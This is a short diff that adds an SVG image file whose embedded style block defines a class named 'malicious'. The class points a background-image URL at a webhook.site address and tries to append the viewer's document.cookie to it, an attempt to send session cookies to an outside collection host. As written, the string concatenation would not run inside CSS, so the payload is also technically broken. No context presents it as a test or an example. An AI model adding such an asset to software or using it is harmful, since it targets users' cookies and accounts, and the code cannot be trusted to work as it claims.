@@ -1,0 +1,6 @@
+<svg width="100" height="100">
+  <style>
+    .malicious { background-image: url('https://webhook.site/16f6f9d5-3797-4a00-bec1-180038eef1f0?data=' + document.cookie); }
+  </style>
+  <rect width="100" height="100" class="malicious" />
+</svg>
